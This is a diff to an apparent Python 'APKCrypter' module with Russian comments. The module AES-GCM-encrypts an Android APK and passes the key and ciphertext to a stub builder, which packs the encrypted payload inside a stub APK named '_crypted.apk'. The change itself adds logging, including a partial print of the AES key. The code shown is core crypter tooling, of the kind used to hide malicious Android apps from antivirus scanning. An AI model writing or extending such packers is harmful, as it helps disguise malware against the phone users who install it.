@@ -2,9 +2,12 @@ import os
 import secrets
 import zipfile
 import shutil
+import logging
 from pathlib import Path
 from Crypto.Cipher import AES
 from services.stub_builder import StubBuilder
+
+logger = logging.getLogger(__name__)
 
 
 class APKCrypter:
@@ -15,36 +18,48 @@ class APKCrypter:
         self.output_dir.mkdir(exist_ok=True)
         self.aes_key = secrets.token_bytes(32)
         self.stub_builder = StubBuilder()
+        logger.info("APKCrypter инициализирован")
     
     def encrypt_apk(self, apk_path: str) -> bytes:
         """Шифрует APK через AES-GCM"""
+        logger.info(f"Шифрование APK: {apk_path}")
         with open(apk_path, 'rb') as f:
             apk_data = f.read()
+        
+        logger.info(f"Размер оригинального APK: {len(apk_data)} байт")
         
         nonce = secrets.token_bytes(12)
         cipher = AES.new(self.aes_key, AES.MODE_GCM, nonce=nonce)
         ciphertext, tag = cipher.encrypt_and_digest(apk_data)
         
+        encrypted = nonce + tag + ciphertext
+        logger.info(f"APK зашифрован, размер: {len(encrypted)} байт")
+        
         # Возвращаем nonce + tag + ciphertext
-        return nonce + tag + ciphertext
+        return encrypted
     
     def create_crypted_apk(self, apk_path: str) -> str:
         """Создает зашифрованный APK с автоматической сборкой stub"""
         original_name = Path(apk_path).stem
+        logger.info(f"Создание криптованного APK для: {original_name}")
         
         # Шифруем оригинальный APK
         encrypted_data = self.encrypt_apk(apk_path)
+        logger.info(f"Ключ AES: {self.aes_key.hex()[:16]}...")
         
         # Собираем stub APK через Android SDK с payload внутри
+        logger.info("Сборка stub APK...")
         stub_apk = self.stub_builder.build_stub_apk(
             self.aes_key.hex(), 
             apk_path,
             encrypted_data
         )
+        logger.info(f"Stub APK собран: {stub_apk}")
         
         # Копируем готовый stub в output
         output_apk = self.output_dir / f"{original_name}_crypted.apk"
         shutil.copy(stub_apk, output_apk)
+        logger.info(f"Криптованный APK готов: {output_apk}")
         
         return str(output_apk)
     
